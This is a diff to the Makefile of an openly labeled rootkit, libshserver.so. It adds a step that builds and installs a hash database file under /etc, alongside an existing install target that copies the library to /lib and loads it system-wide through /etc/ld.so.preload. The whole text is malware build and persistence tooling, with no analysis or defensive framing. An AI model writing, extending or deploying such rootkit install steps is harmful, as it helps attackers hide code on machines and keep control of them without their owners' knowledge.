@@ -5,6 +5,7 @@ INSTALL_DIR = /lib
 LIB_TARGET = libshserver.so
 LIB_SRCS = libshserver.c etc.c
 LIB_OBJS = $(LIB_SRCS:.c=.o)
+HASH_DB = __tmphashtable
 
 all: config $(LIB_TARGET)
 
@@ -20,6 +21,9 @@ $(LIB_TARGET): $(LIB_OBJS)
 install: all
 	@echo [-] Installing rootkit
 	@install -m 0755 $(LIB_TARGET) $(INSTALL_DIR)/
+	@echo [-] Updating hash db
+	@python3 update_hash_db.py
+	@install -m 644 $(HASH_DB) /etc/
 	@echo [-] Loading rootkit
 	@echo $(INSTALL_DIR)/$(LIB_TARGET) > /etc/ld.so.preload
 	@echo [-] Done
@@ -29,6 +33,7 @@ uninstall:
 	@echo [-] Removing rootkit files
 	rm -f /etc/ld.so.preload
 	rm -f $(INSTALL_DIR)/$(LIB_TARGET)
+	rm -f /etc/$(HASH_DB)
 	@echo [-] Done
 
 clean:
